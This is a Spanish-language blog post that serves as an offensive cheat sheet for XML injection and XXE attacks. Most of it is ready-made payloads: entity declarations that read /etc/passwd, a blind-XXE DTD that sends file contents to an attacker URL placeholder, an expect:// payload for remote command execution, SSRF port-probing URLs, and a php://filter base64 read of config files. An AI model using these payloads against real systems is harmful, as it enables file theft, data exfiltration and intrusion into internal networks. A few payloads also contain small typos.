---
title: "XML Injection"
layout: post
date: 2022-05-17 15:00
image: /assets/images/SQL_Injection.png
headerImage: true
tag:
- web
- hacking
- xml
category: blog
description: Técnica de XML Injection
---

# XML Injection

Consulta normal
```
/example.php?xml=<test>hacker</test>
```

Consulta vulnerada
```
/example.php?xml=<!DOCTYPE foo [<!ENTITY xmli "testing">]><test>&xmli;</test>
```

**IMPORTANTE encodear los carácteres de la consulta**

# XML eXternal Entities - XXE

Es posible indicarle al parser XML un archivo externo para poder leerlo.
```
~~~xml
<!ENTITY name SYSTEM "URI">
```

Ejemplo
```
~~~xml
<!DOCTYPE message [
	...
	<!ENTITY xxefile SYSTEM "file:///etc/password">
]>
<message>
	<body>&xxefile;</body>
</message>
```

Petición
```ad-success
~~~xml
../example.php?xml=<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>
```

# Blind XXE Injection

En este caso es algo más complejo ya que el sistema tiene que tener acceso o visibilidad con el sistema del atacante.

La base de está vulnerabilidad está en la posibilidad de realizar peticiones por DTDs externos. Una manera simple de realizar una petición sería la siguiente:

exfill.dtd
```
~~~xml
<!ENTITY % file SYSTEM []"file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://[url atacante]/?x=%file;'>">
%eval;
%exfil;
```

Petición

```ad-success
~~~xml
../example1.php?xml=<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://[URL atacante]/exfil.dtd"> %xxe;]><test>hola</test>
```

# XXE to RCE - Remote Code Execution

Para poder hacer esto la aplicación tiene que tener habilitado el módulo ‘expect’ de PHP.

```xml
/example.php?xml=<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://PWD">]>
<test>&xxe</test>
```

Adicionalmente se podría lograr con otro métodos, como por ejemplo el uso de la clase de **Java XMLDecoder** en el lado del servidor.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/04b2522f-d817-4aa7-928f-92b228ffac9d/Untitled.png)

# XXE + SSRF

## Server-side Request Forgery

Esta vulnerabilidad se da cuando la máquina vulnerada puede hacer peticiones a otras máquinas internas de la organización, mostrando de forma total o parcial el recurso en la web.

También permite mapear servicios existentes en la red del sistema.

## Como explotar

Una vez se ha identificado una inclusión de ficheros dentro de una aplicación web se puede intentar utilizar esta para acceder a recursos internos de la organización.

### Ejemplo vulnerable

```xml
vulnerable.com/index.php?url=index.php
```

### Payloads

-   http://[..]:80/
-   http://[..]:25/ SMTP
-   http://[..]:22/ SSH
-   http://[..]:3128/ SQUID
-   [http://2130706433/](http://2130706433/) = [http://127.0.0.1](http://127.0.0.1)
-   [http://3232235521/](http://3232235521/) = [http://192.168.0.1](http://192.168.0.1)

# Evasión de filtros

## Parameter Entitites + CDATA + DTD

## Uso de PHP + Base64

Si convertimos el contenido de un archivo a base64 podemos imprimir carácteres especiales que no son imprimibles mediantes XML.

```xml
php://filter/read=**convert.base64-encode**/resource=/path/to/config.php
```

# Recursos externos

## **Ampliación general sobre la explotación de XXE:**

[PayloadsAllTheThings/XXE Injection at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

## Ampliación general sobre la explotación de SSRF:

[](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Requ)

## Tipos de inyecciones XXE:

[Lista de payloads para inyecciones XXE (XML External Entity)](https://www.hackplayers.com/2019/12/lista-de-payloads-para-inyecciones-xxe.html)